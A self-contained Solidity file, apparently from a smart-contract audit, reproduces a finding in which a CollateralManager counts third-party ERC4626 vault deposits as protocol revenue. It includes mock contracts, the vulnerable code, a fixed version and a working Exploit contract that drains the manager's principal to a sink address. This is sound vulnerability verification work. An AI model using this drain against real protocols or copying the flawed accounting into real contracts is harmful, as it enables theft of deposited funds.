// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Tenbin finding 64975:
// "Direct vault deposits incorrectly counted as revenue leading to liquidity drain".
//
// CollateralManager._computeNewRevenue books "revenue" as the raw increase in
// the underlying ERC4626 vault's totalAssets() between two snapshots. ERC4626
// vaults accept deposits from ANY address: when an unrelated third party
// deposits into the vault it mints ITS OWN shares, yet vault.totalAssets() rises
// all the same. The manager mislabels that third-party principal as protocol
// revenue, and the collector (COLLECTOR_ROLE) then withdraws it — transferring
// the manager's OWN collateral principal out, even though the protocol earned
// zero real yield.
//
// Verbatim vulnerable source:
//   - _computeNewRevenue  → finding 64975 (this file's target)
//   - _realizeRevenue / withdrawRevenue → sibling finding 64974 (same
//     CollateralManager.sol, CollateralManager.sol#L374-L386)
//
// Faithful doubles: a minimal ERC20 collateral and a minimal ERC4626 vault whose
// totalAssets() == collateral.balanceOf(vault), so any address can raise it via a
// real deposit(). The bug lives in the manager's totalAssets-based accounting,
// not in vault internals — so the vault double is faithful.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC4626 {
    function totalAssets() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function previewRedeem(uint256 shares) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
}

/// @dev Minimal faithful SafeERC20: reverts if the underlying transfer fails.
library SafeERC20 {
    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        bool ok = token.transfer(to, value);
        require(ok, "SafeERC20: transfer failed");
    }
}

/// @dev Minimal ERC20 collateral token. `mint` is permissionless in the double.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev Faithful minimal ERC4626 vault double.
///      totalAssets() == underlying balance held by the vault, so a real
///      deposit() from ANY address raises totalAssets(). Shares are minted
///      proportionally to the depositor (they are NOT the manager's).
contract MiniVault {
    MiniToken public asset;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf; // shares

    constructor(MiniToken _asset) {
        asset = _asset;
    }

    function totalAssets() public view returns (uint256) {
        return asset.balanceOf(address(this));
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        uint256 supply = totalSupply;
        uint256 ta = totalAssets(); // assets held BEFORE this deposit
        if (supply == 0 || ta == 0) {
            shares = assets;
        } else {
            shares = assets * supply / ta;
        }
        asset.transferFrom(msg.sender, address(this), assets);
        totalSupply += shares;
        balanceOf[receiver] += shares;
    }

    function previewRedeem(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply;
        if (supply == 0) return 0;
        return shares * totalAssets() / supply;
    }
}

// ── minimal, faithful bases for the verbatim modifiers ───────────────────────

abstract contract MiniAccessControl {
    mapping(bytes32 => mapping(address => bool)) public hasRole;
    error MissingRole();

    modifier onlyRole(bytes32 role) {
        if (!hasRole[role][msg.sender]) revert MissingRole();
        _;
    }

    function _grantRole(bytes32 role, address account) internal {
        hasRole[role][account] = true;
    }
}

abstract contract MiniReentrancyGuard {
    uint256 private _status = 1;
    error Reentrancy();

    modifier nonReentrant() {
        if (_status == 2) revert Reentrancy();
        _status = 2;
        _;
        _status = 1;
    }
}

abstract contract MiniPausable {
    bool public paused;
    error EnforcedPause();

    modifier notPaused() {
        if (paused) revert EnforcedPause();
        _;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. _computeNewRevenue is verbatim from finding 64975;
// _realizeRevenue / withdrawRevenue are verbatim from sibling finding 64974
// (same CollateralManager.sol). The revenue-related state is verbatim too.
// ─────────────────────────────────────────────────────────────────────────────
contract CollateralManager is MiniAccessControl, MiniReentrancyGuard, MiniPausable {
    using SafeERC20 for IERC20;

    bytes32 public constant COLLECTOR_ROLE = keccak256("COLLECTOR_ROLE");

    mapping(address => IERC4626) public vaults;
    mapping(address => uint256) public pendingRevenue;
    mapping(address => uint256) public lastTotalAssets;

    error CollateralNotSupported();
    error ExceedsPendingRevenue();

    event RevenueWithdraw(address indexed collateral, uint256 amount);

    // ── test scaffolding (NOT part of the audited source) ───────────────────
    function setupGrantCollector(address who) external {
        _grantRole(COLLECTOR_ROLE, who);
    }

    function setupRegisterVault(address collateral, IERC4626 vault) external {
        vaults[collateral] = vault;
    }

    /// @dev Manager supplies principal into the vault and records the baseline.
    function setupDepositPrincipal(address collateral, uint256 amount) external {
        IERC4626 vault = vaults[collateral];
        IERC20(collateral).approve(address(vault), amount);
        vault.deposit(amount, address(this));
        lastTotalAssets[collateral] = vault.totalAssets();
    }

    // ── VERBATIM vulnerable code ────────────────────────────────────────────
    function _computeNewRevenue(address collateral, IERC4626 vault) internal view returns (uint256 revenue) {
        uint256 totalAssets = vault.totalAssets(); // @> counts third-party deposits as protocol revenue (uses raw vault totalAssets, not protocol-owned share value)
        uint256 lastTotal = lastTotalAssets[collateral];
        if (totalAssets > lastTotal) {
            unchecked {
                revenue = totalAssets - lastTotal;
            }
        }
    }

    function _realizeRevenue(address collateral, IERC4626 vault) internal {
        uint256 newRevenue = _computeNewRevenue(collateral, vault);
        if (newRevenue > 0) pendingRevenue[collateral] += newRevenue;
    }

    function withdrawRevenue(address collateral, uint256 amount) external nonReentrant notPaused onlyRole(COLLECTOR_ROLE) {
        IERC4626 vault = vaults[collateral];
        if (address(vault) == address(0)) revert CollateralNotSupported();

        _realizeRevenue(collateral, vault);
        uint256 totalRevenue = pendingRevenue[collateral];

        if (amount > totalRevenue) revert ExceedsPendingRevenue();

        IERC20(collateral).safeTransfer(msg.sender, amount);
        unchecked {
            pendingRevenue[collateral] = totalRevenue - amount;
        }

        lastTotalAssets[collateral] = vault.totalAssets();
        emit RevenueWithdraw(collateral, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED variant (negative control): _computeNewRevenue values only the
// protocol-owned shares via previewRedeem(balanceOf(this)), the recommended fix.
// ─────────────────────────────────────────────────────────────────────────────
contract CollateralManagerFixed is MiniAccessControl, MiniReentrancyGuard, MiniPausable {
    using SafeERC20 for IERC20;

    bytes32 public constant COLLECTOR_ROLE = keccak256("COLLECTOR_ROLE");

    mapping(address => IERC4626) public vaults;
    mapping(address => uint256) public pendingRevenue;
    mapping(address => uint256) public lastTotalAssets;

    error CollateralNotSupported();
    error ExceedsPendingRevenue();

    event RevenueWithdraw(address indexed collateral, uint256 amount);

    function setupGrantCollector(address who) external {
        _grantRole(COLLECTOR_ROLE, who);
    }

    function setupRegisterVault(address collateral, IERC4626 vault) external {
        vaults[collateral] = vault;
    }

    function setupDepositPrincipal(address collateral, uint256 amount) external {
        IERC4626 vault = vaults[collateral];
        IERC20(collateral).approve(address(vault), amount);
        vault.deposit(amount, address(this));
        // baseline on protocol-owned share value (fix keeps this consistent).
        lastTotalAssets[collateral] = vault.previewRedeem(vault.balanceOf(address(this)));
    }

    // FIX: revenue = increase in the value of PROTOCOL-OWNED shares only.
    function _computeNewRevenue(address collateral, IERC4626 vault) internal view returns (uint256 revenue) {
        uint256 shares = vault.balanceOf(address(this));
        uint256 currentAssetValue = vault.previewRedeem(shares);
        uint256 lastTotal = lastTotalAssets[collateral];
        if (currentAssetValue > lastTotal) {
            unchecked {
                revenue = currentAssetValue - lastTotal;
            }
        }
    }

    function _realizeRevenue(address collateral, IERC4626 vault) internal {
        uint256 newRevenue = _computeNewRevenue(collateral, vault);
        if (newRevenue > 0) pendingRevenue[collateral] += newRevenue;
    }

    function withdrawRevenue(address collateral, uint256 amount) external nonReentrant notPaused onlyRole(COLLECTOR_ROLE) {
        IERC4626 vault = vaults[collateral];
        if (address(vault) == address(0)) revert CollateralNotSupported();

        _realizeRevenue(collateral, vault);
        uint256 totalRevenue = pendingRevenue[collateral];

        if (amount > totalRevenue) revert ExceedsPendingRevenue();

        IERC20(collateral).safeTransfer(msg.sender, amount);
        unchecked {
            pendingRevenue[collateral] = totalRevenue - amount;
        }

        lastTotalAssets[collateral] = vault.previewRedeem(vault.balanceOf(address(this)));
        emit RevenueWithdraw(collateral, amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver. The Exploit plays the COLLECTOR_ROLE holder ("collector").
// Setup (constructor): manager holds direct collateral reserve (principal) and
// has deposited principal into the vault, recording lastTotalAssets.
// Attack (run): an unrelated depositor adds D directly to the vault; the
// collector withdraws D as "revenue", draining D of the manager's principal.
// The drained principal is routed to the SINK (collector sink).
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant THIRD_PARTY = 0x000000000000000000000000000000000000bEEF;

    uint256 internal constant VAULT_PRINCIPAL = 1000 ether; // manager deposits into the vault
    uint256 internal constant MANAGER_RESERVE = 1000 ether; // manager's direct collateral reserve (principal)
    uint256 internal constant THIRD_PARTY_DEPOSIT = 1000 ether; // D — direct third-party deposit

    MiniToken public collateral;
    MiniVault public vault;
    CollateralManager public manager;

    // exposed results
    address public collateralAddr;
    address public vaultAddr;
    address public managerAddr;

    uint256 public managerReserveBefore;
    uint256 public managerReserveAfter;
    uint256 public drained;
    uint256 public trueProtocolYield;
    uint256 public sinkBalance;

    constructor() {
        // deploy doubles + vulnerable manager (order: token, vault, manager)
        collateral = new MiniToken("Tenbin Collateral", "LOST-COLL");
        vault = new MiniVault(collateral);
        manager = new CollateralManager();

        collateralAddr = address(collateral);
        vaultAddr = address(vault);
        managerAddr = address(manager);

        // the Exploit is the collector (COLLECTOR_ROLE holder)
        manager.setupGrantCollector(address(this));
        manager.setupRegisterVault(address(collateral), IERC4626(address(vault)));

        // fund the manager: principal to deposit into the vault + a direct reserve
        collateral.mint(address(manager), VAULT_PRINCIPAL + MANAGER_RESERVE);

        // manager supplies principal into the vault and records the baseline
        manager.setupDepositPrincipal(address(collateral), VAULT_PRINCIPAL);
        // manager now: direct reserve = MANAGER_RESERVE, owns VAULT_PRINCIPAL of shares
    }

    function run() external payable {
        // ── ATTACK: an unrelated party deposits D directly into the vault ──
        // (no protocol yield — the shares for D are minted to THIRD_PARTY)
        collateral.mint(address(this), THIRD_PARTY_DEPOSIT);
        collateral.approve(address(vault), THIRD_PARTY_DEPOSIT);
        vault.deposit(THIRD_PARTY_DEPOSIT, THIRD_PARTY);

        // snapshots BEFORE the drain
        managerReserveBefore = collateral.balanceOf(address(manager));
        // true protocol yield = value of manager-owned shares vs recorded baseline == 0
        uint256 managerShares = vault.balanceOf(address(manager));
        trueProtocolYield = vault.previewRedeem(managerShares) - VAULT_PRINCIPAL;

        // ── collector withdraws the mislabeled "revenue" (drains principal) ──
        manager.withdrawRevenue(address(collateral), THIRD_PARTY_DEPOSIT);

        managerReserveAfter = collateral.balanceOf(address(manager));
        drained = managerReserveBefore - managerReserveAfter;

        // route the drained principal to the SINK (collector sink)
        collateral.transfer(SINK, drained);
        sinkBalance = collateral.balanceOf(SINK);

        // ── HARM: D of principal drained, for zero real protocol yield ──
        require(drained == THIRD_PARTY_DEPOSIT, "no principal drained");
        require(trueProtocolYield == 0, "yield was real");
        require(sinkBalance == THIRD_PARTY_DEPOSIT, "sink did not receive drained principal");
    }
}
